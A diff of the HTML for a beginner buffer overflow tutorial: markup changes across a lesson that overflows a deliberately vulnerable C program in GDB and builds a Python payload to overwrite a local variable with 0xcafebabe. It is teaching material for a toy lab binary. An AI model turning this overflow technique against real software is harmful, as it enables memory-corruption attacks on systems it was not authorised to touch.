@@ -52,8 +52,8 @@
             <center>
                 <h1 style="color: #1b1b1b;">Modifying local variables on the stack - Part II</h1>
             </center>
-            Hey guys! What's up?<br>Welcome to the third tutorial of the Buffer Overflow series. In the previous tutorial, we learnt how we can overflow a buffer to change the value of a local variable. This time there is gonna be a slight change in it.<br>
-            <br>
+            Hey guys! What's up?<br />Welcome to the third tutorial of the Buffer Overflow series. In the previous tutorial, we learnt how we can overflow a buffer to change the value of a local variable. This time there is gonna be a slight change in it.<br />
+            <br />
             <h2 style="color: #3b3b3b;">What we will be learning through this tutorial</h2>
             <ul>
                 <li style="margin: 10px 0;"><a style="text-decoration: none;" href="#Offset-Determination">
@@ -73,7 +73,7 @@
                     </a></li>
             </ul>
             The source code of the vulnerable C program will be almost same as the previous one. It's given below, take a look at it :-
-            <pre><div id="snip"><b><font color="#aaa">//  File name     : controlLocalVariable.c
+            <pre><div class="snip"><b><font color="#aaa">//  File name     : controlLocalVariable.c
 //  Compile with  : gcc controlLocalVariable.c -m64 -o controlLocalVariable.elf</font>
 
 <font color="#55FFFF">#include</font> <font color="#FF55FF">&lt;stdio.h&gt;</font>
@@ -90,27 +90,27 @@
   printf(<font color="#FF55FF">"Nope! You were not given the access.\n"</font>);
   <font color="#FFFF55">return</font> <font color="#FF55FF">0</font>;
 }</b></div></pre>
-            As you can see the only change is in the if statement. In the previous code the `if block` was executed if the 'value' variable was not equal to 1501. This time it will be executed if the 'value' variable is equal to 0xcafebabe [ or 3405691582 in decimal form ].<br>
-            <br>
-            Again we need to overflow the buffer and write the excess data in the integer variable. Seems simple right?<br>
+            As you can see the only change is in the if statement. In the previous code the `if block` was executed if the 'value' variable was not equal to 1501. This time it will be executed if the 'value' variable is equal to 0xcafebabe [ or 3405691582 in decimal form ].<br />
+            <br />
+            Again we need to overflow the buffer and write the excess data in the integer variable. Seems simple right?<br />
             Great! Let's start building our exploit.
             <a id="Offset-Determination">
                 <h2 style="color: #3b3b3b;">STEP-1 : Determination of correct offset</h2>
             </a>
-            Now, we can't just randomly write any number of bytes right? We need a specific number of junk bytes which will fill the buffer and write 0xcafebabe as the excess data in the variable. So, that number of bytes required to reach the int variable [ RBP-0x4, as explaining the previous tutorial ], such that any data after those number of bytes will be written into the int variable is called offset. Thus it is very important to determine the correct offset to the int variable. So anyway our exploit will be :-<br>
+            Now, we can't just randomly write any number of bytes right? We need a specific number of junk bytes which will fill the buffer and write 0xcafebabe as the excess data in the variable. So, that number of bytes required to reach the int variable [ RBP-0x4, as explaining the previous tutorial ], such that any data after those number of bytes will be written into the int variable is called offset. Thus it is very important to determine the correct offset to the int variable. So anyway our exploit will be :-<br />
             <p>XXXXXX.... (no. of X = offset) + 0xcafebabe</p>
-            Let's ignore 0xcafebabe for now and write "AAAA" instead of that. The character "A" has the hex code 0x41<sup>*</sup> [ remember this! ], this means that after hitting the correct offset, the extra "AAAA" will be written into RBP-0x4 [ int variable ] and if we analyse it with GDB [ the debugger we are going to be using for this series ] the value stored should be 0x41414141. So now the question is what's the offset?<br>
+            Let's ignore 0xcafebabe for now and write "AAAA" instead of that. The character "A" has the hex code 0x41<sup>*</sup> [ remember this! ], this means that after hitting the correct offset, the extra "AAAA" will be written into RBP-0x4 [ int variable ] and if we analyse it with GDB [ the debugger we are going to be using for this series ] the value stored should be 0x41414141. So now the question is what's the offset?<br />
             Well obviously 64 right? The buffer is of 64 bytes and just beneath it lies the int variable, so the 65th byte and the rest should be overwritten to the int variable.
             <a id="Compiling-n-testing">
                 <h2 style="color: #3b3b3b;">STEP-2 : Compiling and testing</h2>
             </a>
             Let's compile the program with the command commented in the source code. Once you are done with that, open it with GDB :-
-            <pre><div id="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># gdb ./controlLocalVariable.elf -q
+            <pre><div class="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># gdb ./controlLocalVariable.elf -q
 Reading symbols from <font color="#55FF55">./controlLocalVariable.elf</font>...
 (No debugging symbols found in <font color="#55FF55">./controlLocalVariable.elf</font>)
 gdb-peda$ </div></pre>
             Perfect, now GDB is running with controlLocalVariable.elf. You must be wondering why have I used that "-q", well that's not important, it simply means `q`uite mode and prevents a huge banner from printing before the console starts. Anyway, now the console is setup, so we can type 'disass main'. This command will disassemble the main function from the binary and show its almost equivalent assembly. This is super helpful when you don't have the source code, at that time you need to understand the program logic by its assembly itself. But anyway here is the output :-
-            <pre><div id="snip">gdb-peda$ disass main
+            <pre><div class="snip">gdb-peda$ disass main
 Dump of assembler code for function main:
    <font color="#8181FF">0x0000000000001155</font> &lt;+0&gt;:   push   rbp
    <font color="#8181FF">0x0000000000001156</font> &lt;+1&gt;:   mov    rbp,rsp
@@ -142,12 +142,12 @@ Dump of assembler code for function main:
 End of assembler dump.
 gdb-peda$ </div></pre>
             As you can see in the above snippet, in the line +60, the program compares [ denoted by the 'cmp' assembly instruction ] the dword value in the location rbp-0x4 [ which is the integer variable, I have explained this in the previous tutorial properly. ] with the 0xcafebabe. Now let's set a breakpoint at main+60, so that we can analyse the program just before it compares the variable.
-            <pre><div id="snip">gdb-peda$ break * main+60
+            <pre><div class="snip">gdb-peda$ break * main+60
 Breakpoint 1 at <font color="#8181FF"> 0x1191</font>
 gdb-peda$ 
 </div></pre>
             Great now, let's run the program in GDB with 64 times "X" + 4 times "A". Let's check if the 4 "A" overwrite the int variable :-
-            <pre><div id="snip">gdb-peda$ run `python3 -c 'text="X" * 64; text += "AAAA"; print(text)'`
+            <pre><div class="snip">gdb-peda$ run `python3 -c 'text="X" * 64; text += "AAAA"; print(text)'`
 Starting program: /root/Desktop/Buffer Overflow/controlLocalVariable.elf `python3 -c 'text="X" * 64; text += "AAAA"; print(text)'`
 Copying argv[1] to buffer ...
 
@@ -155,18 +155,18 @@ Breakpoint 1, <font color="#8181FF">0x0000555555555191</font> in <font color="#F
 gdb-peda$ <b>x/wx $rbp-0x4
 <font color="#8181FF">0x7fffffffdfac</font>: 0x000005dd</b>
 gdb-peda$ </div></pre>
-            Wait what?! We overflowed the buffer, and so the excess 4 "A" should be overwritten to the int variable right??! Then why is this not working? Think about it!<br>
+            Wait what?! We overflowed the buffer, and so the excess 4 "A" should be overwritten to the int variable right??! Then why is this not working? Think about it!<br />
             <a id="Fixing-mistakes">
                 <h2 style="color: #3b3b3b;">STEP-3 : Fixing the mistakes</h2>
             </a>
             If you have read the previous tutorial properly then you will be able to solve the issue quite easily. I had clearly mentioned that the stack layout is not 100% accurate and there will be some space between the end of the buffer and the start of int variable. So the perhaps we have overwritten that space and not the int variable. So the stack layout should look somewhat like this :-
-            <br><br>
-            <div id="image"><img src="https://i.imgur.com/CZxxYjh.png" class="responsive"></div><br>
-            Now how do we get the correct offset?<br>
-            <br>
+            <br /><br />
+            <div id="image"><img src="https://i.imgur.com/CZxxYjh.png" class="responsive"></div><br />
+            Now how do we get the correct offset?<br />
+            <br />
             It's simple we will use a pattern like below and feed that to the program.
-            <pre><div id="snip">AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ</div></pre>
-            <pre><div id="snip">gdb-peda$ run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+            <pre><div class="snip">AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ</div></pre>
+            <pre><div class="snip">gdb-peda$ run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
 Starting program: /root/Desktop/Buffer Overflow/controlLocalVariable.elf AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
 Copying argv[1] to buffer ...
 
@@ -174,12 +174,12 @@ Breakpoint 1, <font color="#8181FF">0x0000555555555191</font> in <font color="#F
 gdb-peda$ <b>x/wx $rbp-0x4
 <font color="#8181FF">0x7fffffffdfac</font>: 0x54545454</b>
 gdb-peda$ </div></pre>
-            Notice this time, the value is different. This time the value is 0x54545454, if you convert this hex to ASCII you will get "TTTT".<br>
+            Notice this time, the value is different. This time the value is 0x54545454, if you convert this hex to ASCII you will get "TTTT".<br />
             So the 'TTTT' is overflowed to the int variable and thus the number of bytes from AAAABB.. all the way up to SSSS == the offset.
-            'S' is the 19th character and every character is repeated 4 times, therefore the offset is :<br>
-            19 x 4 == 76<br>
+            'S' is the 19th character and every character is repeated 4 times, therefore the offset is :<br />
+            19 x 4 == <span style="border: thin solid #555; padding: 3px">76</span><br />
             Perfect! Now, let's feed 76 times "X" + 4 times "A". If we get 0x41414141 [ hex representation of 'AAAA' ] in rbp-0x4, then our offset will be correct.
-            <pre><div id="snip">gdb-peda$ run `python3 -c 'a = "X" * 76 + "A" * 4; print(a)'`
+            <pre><div class="snip">gdb-peda$ run `python3 -c 'a = "X" * 76 + "A" * 4; print(a)'`
 Starting program: /root/Desktop/Buffer Overflow/controlLocalVariable.elf `python3 -c 'a = "X" * 76 + "A" * 4; print(a)'`
 Copying argv[1] to buffer ...
 
@@ -191,28 +191,28 @@ gdb-peda$ </div></pre>
             <a id="Endianness">
                 <h2 style="color: #3b3b3b;">STEP-4 : Determining the endianness</h2>
             </a>
-            Before we write 0xcafebabe in the int varialbe, we firt need to determine the endianness of your computer.<br>
-            First of all, what is endianness? According to a wiki `In computing, endianness is the ordering or sequencing of bytes of a word of digital data in computer memory storage or during transmission. Endianness is primarily expressed as big-endian or little-endian. A big-endian system stores the most significant byte of a word at the smallest memory address and the least significant byte at the largest. A little-endian system, in contrast, stores the least-significant byte at the smallest address`.<br>
-            <br>
+            Before we write 0xcafebabe in the int varialbe, we firt need to determine the endianness of your computer.<br />
+            First of all, what is endianness? According to a wiki `In computing, endianness is the ordering or sequencing of bytes of a word of digital data in computer memory storage or during transmission. Endianness is primarily expressed as big-endian or little-endian. A big-endian system stores the most significant byte of a word at the smallest memory address and the least significant byte at the largest. A little-endian system, in contrast, stores the least-significant byte at the smallest address`.<br />
+            <br />
             So the image shown below might give you a idea how important is endianness. If your computer is a little-endian and you write 0xcafebabe in big-endian format then all the bytes will be placed in reverse order and we would not proceed to the if block.
-            <br><br>
-            <div id="image"><img src="https://i.imgur.com/9OUi7aT.png" class="responsive"></div><br>
-            Now how do you get the endianness of your machine?<br>
+            <br /><br />
+            <div id="image"><img src="https://i.imgur.com/9OUi7aT.png" class="responsive"></div><br />
+            Now how do you get the endianness of your machine?<br />
             Luckily we have a very simple way to identify the endianness using a one-line python command.
-            <pre><div id="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># python3 -c 'import sys; print(sys.byteorder)'
+            <pre><div class="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># python3 -c 'import sys; print(sys.byteorder)'
 little
 <b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># </div></pre>
             As you can see, my computer is little-endian which most of you all should have, but anyway this means that we need to write the bytes in reverse order like this :-
-            <pre><div id="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># echo -e "\xbe\xba\xfe\xca"
+            <pre><div class="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># echo -e "\xbe\xba\xfe\xca"
 ����
 <b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># </div></pre>
-            Wait! What are those ugly characters???<br>
+            Wait! What are those ugly characters???<br />
             Well if you notice, all the bytes are greater than 7f [ or decimal 127 ] this means that they all are beyond representable characters. That's why they appear in question mark(?) like symbols on my terminal, and like these weird characters on your web browser.
             <a id="Exploit">
                 <h2 style="color: #3b3b3b;">STEP-5 : Building up the final exploit</h2>
             </a>
             Now for a better understanding, let's make a python file which will print 76 "A" + 0xcafebabe in little-endian format.
-            <pre><div id="snip"><font color="#8181FF">import</font> sys
+            <pre><div class="snip"><font color="#8181FF">import</font> sys
 <font color="#8181FF">from</font> struct <font color="#8181FF">import</font> pack
 
 exploit  = b<font color="#FF55FF">""</font>
@@ -221,10 +221,10 @@ exploit += pack(<font color="#FF55FF">"&lt;I"</font>, <font color="#FF55FF">0xca
 
 sys.stdout.buffer.write(exploit)    <b><font color="#aaa"># This is because python3 does not support printing raw bytes directly using the print() function. So this is useful.</font></b></div></pre>
             Since in python3 we cannot print raw-bytes using the print() function we need to use the buffer write from the sys library. Anyway here is the output :-
-            <pre><div id="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># python3 payload.py 
+            <pre><div class="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># python3 payload.py 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����<b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># </div></pre>
             Seems correct now let's feed this as the first argument to the binary and see what happens
-            <pre><div id="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># ./controlLocalVariable.elf `python3 payload.py`
+            <pre><div class="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># ./controlLocalVariable.elf `python3 payload.py`
 Copying argv[1] to buffer ...
 <b>Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����</b>
 Nope! You were not given the access.
@@ -240,8 +240,8 @@ Nope! You were not given the access.
                 <button id="contactFormButton"><span id="buttonUnderline">Fill the Form</span></button>
             </div>
             <div id="align_right">
-                Good luck,<br>
-                VulnX<br>
+                Good luck,<br />
+                VulnX<br />
             </div>
             <hr class="new5">
             <div class="icons">
@@ -268,7 +268,7 @@ Nope! You were not given the access.
         <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/'">Home</p>
         <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/resources.html'">Resources</p>
         <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/tutorials.html'">Tutorials</p>
-        <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/ctfs.html'">CTFs</p>
+        <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/CTFs.html'">CTFs</p>
         <h1 id="footerHeading" style="background-color: transparent; font-family: 'Ubuntu';">Contact</h1>
         <i class="fab fa-facebook-f" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='#'"></i>
         <i class="fab fa-google" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='mailto:vulnx101@gmail.com'"></i>
